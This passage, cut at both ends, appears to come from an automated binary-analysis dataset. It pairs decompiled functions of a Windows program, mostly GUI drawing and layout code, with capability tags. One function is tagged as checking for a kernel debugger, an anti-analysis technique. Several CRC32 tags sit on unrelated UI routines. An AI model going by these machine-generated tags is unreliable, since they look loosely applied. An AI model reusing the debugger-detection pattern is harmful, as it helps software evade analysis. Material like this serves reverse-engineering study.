-8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if ((*(*(lprc + -0x38) + 0x38) != '\\0') ||\n       (((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')) && (*(lprc + -0x21) == '\\0')))) {\n        uVar7 = fcn.00428b60();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x18) = *(lprc + -0x10) + -1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.00428404();\n        }\n        fcn.004287a8();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.00428b60();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.00428b60();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x18) = *(lprc + -0x10) + -1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4a475c) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00427ed4();\n    }\n    fcn.0045490c(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    *(lprc + -0x20) = *(lprc + -0x5c);\n    *(lprc + -0x18) = *(lprc + -0x54);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.0045490c(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        fcn.00453968();\n        *(lprc + -0x20) = 10;\n        iVar5 = fcn.004289bc();\n        *(lprc + -0x18) = iVar5 + *(lprc + -0x20);\n        in_stack_ffffffa4 = 2;\n        fcn.0045490c(2, *(lprc + -0x29), lprc + -0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.0040546c(0x455e2d);\n    return;\n}\n",
        "token_count": 4206
    },
    "00455e44": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00455e44(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_ECX;\n    uint var_65h;\n    uint var_5dh;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    var_20h = *in_ECX;\n    uStack32 = in_ECX[1];\n    uStack28 = in_ECX[2];\n    uStack24 = in_ECX[3];\n    iVar2 = fcn.00456988();\n    iVar3 = fcn.00455f9c();\n    cVar1 = fcn.0040e280();\n    if ((cVar1 != '\\0') && (iVar4 = fcn.00452050(),  *(iVar4 + 5) != '\\0')) {\n        (***0x4a4cc4)(0, 0x3e9);\n    }\n    if (((iVar2 == 0) || ((*(iVar2 + 0x40) == '\\0' && (iVar3 == 0)))) ||\n       ((*(in_EAX + 0x9a) == 0 && (*(in_EAX + 0x92) == 0)))) {\n        if ((iVar2 == 0) || (cVar1 = fcn.00458208(),  cVar1 != '\\0')) {\n            fcn.004554c4(&stack0xfffffffc);\n        }\n        else {\n            fcn.00454b64(&stack0xfffffffc);\n        }\n    }\n    else {\n        (**(*in_EAX + 0x34))((arg_ch & 1) != 0);\n        if (*(in_EAX + 0x9a) != 0) {\n            (*in_EAX[0x26])(arg_ch, &var_20h);\n        }\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "00456850": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456850(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00404640();\n        *(in_EAX + 0x44) = 0;\n    }\n    else {\n        if (*(in_EAX + 0x44) == 0) {\n            iVar1 = fcn.0040483c();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x44) = uVar2;\n        }\n        (**(**(in_EAX + 0x44) + 0xc))();\n        iVar1 = *(in_EAX + 0x44);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x456ae8;\n        fcn.0040483c();\n        fcn.0041f744();\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "004579e4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004579e4(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint pwszKLID;\n    uint var_ch;\n    uint hLibModule;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x457b17;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    pwszKLID._0_1_ = 0;\n    puStack56 = &fcn.004579e4::pwszKLID;\n    puStack60 = 0x457a11;\n    sub.user32.dll_GetKeyboardLayoutNameA();\n    puStack60 = 0x457a1d;\n    var_ch = fcn.00420b38();\n    uStack64 = 0x457aed;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x457a3b;\n    puStack60 = &stack0xfffffffc;\n    fcn.00420c14();\n    puStack72 = 0x457a4b;\n    fcn.004056dc();\n    puStack72 = 0x457a5b;\n    fcn.00405784();\n    puStack72 = 0x457a66;\n    fcn.00420e7c();\n    puStack72 = 0x457a76;\n    fcn.004214dc();\n    puStack72 = 0x457a83;\n    uVar1 = fcn.0040f90c();\n    uStack76 = 0x457ad0;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    hLibModule = uVar1;\n    pcVar2 = sub.kernel32.dll_GetProcAddress_1(uVar1, 0x457b74);\n    iVar3 = (*pcVar2)();\n    *0x4a4778 = (*(iVar3 + 0x28) & 1) == 1;\n    *in_FS_OFFSET = uVar1;\n    uStack80 = 0x457ad7;\n    sub.kernel32.dll_FreeLibrary_1(hLibModule);\n    return;\n}\n",
        "token_count": 619
    },
    "00457f30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457f30(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint hMenu;\n    \n    iVar1 = sub.user32.dll_GetMenuItemCount();\n    puVar2 = arg_8h + -0x200;\n    iVar4 = 0;\n    while ((iVar4 < iVar1 && (puVar2 < arg_8h + -5))) {\n        fcn.00458538(0x400, (arg_8h + -5) - puVar2, puVar2);\n        puVar2 = fcn.0040a794();\n        uVar3 = sub.user32.dll_GetMenuState();\n        if ((uVar3 & 2) != 0) {\n            *puVar2 = 0x24;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 0x40) != 0) {\n            *puVar2 = 0x40;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 1) != 0) {\n            *puVar2 = 0x23;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        *puVar2 = 0x3b;\n        puVar2 = puVar2 + 1;\n        *puVar2 = 0;\n        iVar4 = iVar4 + 1;\n    }\n    return;\n}\n",
        "token_count": 378
    },
    "00458fd4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458fd4(uint arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint var_15h;\n    uint var_4h;\n    \n    if ((**0x4a4d30 < 5) && ((**0x4a4d30 != 4 || (**0x4a4fdc < 1)))) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.0040483c();\n    cVar2 = fcn.004047cc();\n    if (((arg_8h & 1) == 0) || ((cVar2 != '\\0' && ((cVar2 == '\\0' || (bVar1)))))) {\n        if ((bVar1) && ((arg_8h & 0x80) != 0)) {\n            fcn.00428404();\n            fcn.00427b48();\n        }\n        else {\n            fcn.00428404();\n            fcn.00427b48();\n        }\n    }\n    else {\n        fcn.00428404();\n        fcn.00427b48();\n    }\n    (**(*in_EAX + 0x30))(cVar2, arg_8h);\n    return;\n}\n",
        "token_count": 292
    },
    "0045e03c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e03c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x61)) {\n        cVar1 = *(in_EAX + 0x61);\n        *(in_EAX + 0x61) = param_2;\n        if ((*(in_EAX + 7) & 1) == 0) {\n            if (((*0x45e0d8 == cVar1) || (*0x45e0d8 != *(in_EAX + 0x61))) ||\n               ((in_EAX[0x60] == in_EAX[0x10] &&\n                (((in_EAX[0x61] == in_EAX[0x11] && (in_EAX[0x62] == in_EAX[0x12])) && (in_EAX[99] == in_EAX[0x13]))))))\n            {\n                fcn.0045e450();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "0045e0dc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e0dc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00404640();\n        *(in_EAX + 0x6c) = 0;\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) & 0xffff7fff;\n    }\n    else {\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) | 0x8000;\n        if (*(in_EAX + 0x6c) == 0) {\n            iVar1 = fcn.0040483c();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x6c) = uVar2;\n        }\n        (**(**(in_EAX + 0x6c) + 0xc))();\n        iVar1 = *(in_EAX + 0x6c);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x4615bc;\n        fcn.0040483c();\n        fcn.0041f744();\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "0045e2c8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e2c8(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = *(in_EAX + 0x5b);\n    if (param_2 != cVar1) {\n        *(in_EAX + 0x5b) = param_2;\n        fcn.0045e03c();\n        if (((*(in_EAX + 7) & 1) == 0) &&\n           (((((*(in_EAX + 7) & 0x10) == 0 || (in_EAX[0xc] != 0)) && (param_2 != '\\x06')) && (cVar1 != '\\x06')))) {\n            if ((((cVar1 - 1U < 2 == param_2 - 3U < 2) && (cVar1 != '\\0')) && (cVar1 != '\\x05')) &&\n               ((param_2 != '\\0' && (param_2 != '\\x05')))) {\n                (**(*in_EAX + 0x88))(in_EAX[0x12], in_EAX[0x13]);\n            }\n            else if ((cVar1 == '\\0') || (param_2 != '\\0')) {\n                fcn.0040483c();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 351
    },
    "0045e3b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045e3b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    cVar1 = fcn.00460c40();\n    if ((cVar1 != '\\0') &&\n       ((((in_EDX != in_EAX[0x10] || (in_ECX != in_EAX[0x11])) || (arg_ch != in_EAX[0x12])) || (arg_8h != in_EAX[0x13]))\n       )) {\n        fcn.0045f39c();\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        fcn.0045e450();\n        fcn.00461adc();\n        (**(*in_EAX + 0x80))();\n        fcn.004601fc(0);\n        (**(*in_EAX + 0x5c))();\n        if ((*(in_EAX + 7) & 1) == 0) {\n            fcn.0040483c();\n        }\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "0045e450": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0045e450(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack20;\n    uint uStack16;\n    \n    if ((*(in_EAX + 0x164) == '\\0') && ((*(in_EAX + 0x1c) & 1) == 0)) {\n        uVar1 = *(in_EAX + 0x61);\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = uVar3 >> 1;\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + ((uVar3 & 1) != 0);\n        }\n        (**(**(in_EAX + 0x78) + 0x10))(iVar2 + iVar4);\n        (**(**(in_EAX + 0x78) + 0x10))();\n        fcn.00418198();\n        *(in_EAX + 0x16d) = uStack20;\n        *(in_EAX + 0x171) = uStack16;\n        if (*0x45e5d0 == uVar1) {\n            *(in_EAX + 0x175) = 0;\n            *(in_EAX + 0x179) = 0;\n        }\n        else {\n            if ((uVar1 & 4) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x165) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 1) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            if ((uVar1 & 8) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x169) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 2) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            if (*(in_EAX + 0x30) != NULL) {\n                (**(**(in_EAX + 0x30) + 0xd0))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 849
    },
    "0045e82c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e82c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x158) = 1;\n    }\n    *(in_EAX + 0x160) = param_2;\n    return;\n}\n",
        "token_count": 92
    },
    "0045e840": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0045e840(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x158) = 0;\n    }\n    fcn.004054c0();\n    return;\n}\n",
        "token_count": 74
    },
    "0045eb4c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045eb4c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int32_t in_stack_ffffffd4;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    \n    if (param_2 != param_1) {\n        uVar2 = *0x45ed00;\n        if ((*(in_EAX + 7) & 1) != 0) {\n            uVar2 = *(in_EAX + 0x23);\n        }\n        if ((uVar2 & 1) != 0) {\n            in_stack_ffffffd4 = in_EAX[0x10];\n            in_stack_ffffffdc = param_1;\n            sub.kernel32.dll_MulDiv(in_stack_ffffffd4, param_2, param_1);\n        }\n        if ((uVar2 & 2) != 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n        }\n        if (((uVar2 & 4) == 0) || ((*(in_EAX + 0x51) & 1) != 0)) {\n            in_stack_ffffffdc = in_EAX[0x12];\n        }\n        else if ((uVar2 & 1) == 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        else {\n            sub.kernel32.dll_MulDiv(in_EAX[0x10] + in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        bVar3 = (uVar2 & 8) == 0;\n        if ((bVar3) || ((*(in_EAX + 0x51) & 2) != 0)) {\n            iStack32 = in_EAX[0x13];\n        }\n        else {\n            iStack32 = param_1;\n            if (bVar3) {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n            }\n            else {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11] + in_EAX[0x13], param_2, in_stack_ffffffd4);\n            }\n        }\n        fcn.0045ea00();\n        (**(*in_EAX + 0x88))(iStack32, in_stack_ffffffdc);\n        if (*0x45ed08 != (uVar2 & *0x45ed04)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x175), param_2, iStack32);\n            *(in_EAX + 0x175) = uVar1;\n        }\n        if (*0x45ed08 != (uVar2 & *0x45ed0c)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x179), param_2, iStack32);\n            *(in_EAX + 0x179) = uVar1;\n        }\n        if ((*(in_EAX + 0x59) == '\\0') && ((uVar2 & 0x10) != 0)) {\n            uVar1 = fcn.00427e8c(param_2, iStack32);\n            sub.kernel32.dll_MulDiv(uVar1);\n            fcn.00427ea8();\n        }\n    }\n    *(in_EAX + 0x23) = *0x45ed08;\n    return;\n}\n",
        "token_count": 822
    },
    "0045ed2c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0045ed2c(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar *puVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45edc2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar3 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x50) & 0x20) != 0) && (uVar5 = (*(in_EAX + 0x1c) & 1) == 0,  puVar3 = &stack0xfffffffc,  uVar5)) {\n        fcn.0045ef44();\n        fcn.00405894();\n        puVar3 = puStack28;\n        if (uVar5) {\n            iVar1 = *(in_EAX + 4);\n            if (iVar1 != 0) {\n                cVar4 = fcn.004047cc();\n                if ((cVar4 != '\\0') && (puVar3 = puStack28,  (*(iVar1 + 0x1c) & 1) != 0)) goto code_r0x0045ed8e;\n            }\n            bVar2 = true;\n            goto code_r0x0045ed94;\n        }\n    }\ncode_r0x0045ed8e:\n    puStack28 = puVar3;\n    bVar2 = false;\ncode_r0x0045ed94:\n    fcn.0041fbe0();\n    if (bVar2) {\n        fcn.0045ef74();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45edc9;\n    uStack32 = 0x45edc1;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 470
    },
    "0045f1bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f1bc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.0041966c();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1cc) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.00419504();\n                fcn.0041968c();\n                fcn.0045f39c();\n                if ((*(in_EAX + 0x1c) & 1) == 0) {\n                    iVar2 = fcn.00471978();\n                    if ((*(iVar2 + 0x54) & 4) != 0) {\n                        fcn.0040483c();\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "0045f680": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0045f680(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    int32_t iStack20;\n    \n    cVar1 = fcn.0046bc54();\n    if (cVar1 != '\\0') {\n        fcn.0046bd14();\n    }\n    cVar1 = fcn.004047cc();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x8f) != '\\x01')) {\n        fcn.0040dab4();\n        fcn.00404eb4();\n    }\n    fcn.00460230();\n    if ((*0x4ab008 == 0) || (*0x4ab008 == -1)) {\n        *0x4ab008 = 0;\n        if ((*(in_EAX + 0x54) & 1) != 0) {\n            sub.user32.dll_GetCursorPos(&iStack32);\n            fcn.0045ea84();\n            iStack32 = iStack20;\n            uStack28 = uStack24 & 0xffff | iStack20 << 0x10;\n            fcn.004601fc(uStack28);\n        }\n        if (*0x4ab008 != -1) {\n            fcn.0045cf14();\n        }\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "00461004": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461004(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + -0x10))();\n    if (*0x4610b0 == (*0x4610ac & *(in_EAX + 7))) {\n        iVar1 = in_EAX[0x1d];\n        if ((*(iVar1 + 0xc) == 0) || (in_EAX[0x12] <= *(iVar1 + 0xc))) {\n            if ((*(iVar1 + 0x14) != 0) && (in_EAX[0x12] < *(iVar1 + 0x14))) {\n                *(iVar1 + 0x14) = in_EAX[0x12];\n            }\n        }\n        else {\n            *(iVar1 + 0xc) = in_EAX[0x12];\n        }\n        if ((*(iVar1 + 8) == 0) || (in_EAX[0x13] <= *(iVar1 + 8))) {\n            if ((*(iVar1 + 0x10) != 0) && (in_EAX[0x13] < *(iVar1 + 0x10))) {\n                *(iVar1 + 0x10) = in_EAX[0x13];\n            }\n        }\n        else {\n            *(iVar1 + 8) = in_EAX[0x13];\n        }\n        iVar1 = *(param_2 + 8);\n        if ((((iVar1 != 0) && (in_EAX[0x25] != 0)) && ((*(in_EAX + 0x55) & 4) == 0)) &&\n           ((((*(iVar1 + 0x18) & 1) == 0 && (*(iVar1 + 0x10) != 0)) && (*(iVar1 + 0x14) != 0)))) {\n            fcn.00460230();\n        }\n    }\n    return;\n}\n",
        "token_count": 444
    },
    "00461f84": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461f84(uint arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    int32_t *in_EAX;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_24h = *arg_10h;\n    uStack36 = arg_10h[1];\n    uStack32 = arg_10h[2];\n    uStack28 = arg_10h[3];\n    var_4h = in_EAX;\n    if ((arg_14h == 0) || (*(arg_14h + 0x4a4798) != *(in_EDX + 0x61))) {\n        if ((*(in_EDX + 0x175) != 0) && (*(in_EDX + 0x179) != 0)) {\n            var_8h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_ch = (**(**(in_EDX + 0x78) + 0x10))();\n            var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n            if ((*(in_EDX + 0x61) & 4) == 0) {\n                if ((*(in_EDX + 0x61) & 1) == 0) {\n                    var_24h = *(in_EDX + 0x165);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 1) == 0) {\n                var_8h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            else {\n                var_10h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            if ((*(in_EDX + 0x61) & 8) == 0) {\n                if ((*(in_EDX + 0x61) & 2) == 0) {\n                    var_24h = *(in_EDX + 0x169);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 2) == 0) {\n                var_ch = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            else {\n                var_14h = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            if (arg_8h != '\\0') {\n                if (*0x46235c != (*0x462358 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x16d);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n                if (*0x46235c != (*0x462360 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x171);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            fcn.0046c474(1, var_14h, var_10h);\n        }\n        if (arg_14h == 0) {\n            return;\n        }\n    }\n    var_10h = arg_ch[2] - *arg_ch;\n    if (((var_10h < 0) || (arg_14h - 3 < 2)) || (arg_14h == 6)) {\n        var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_14h = 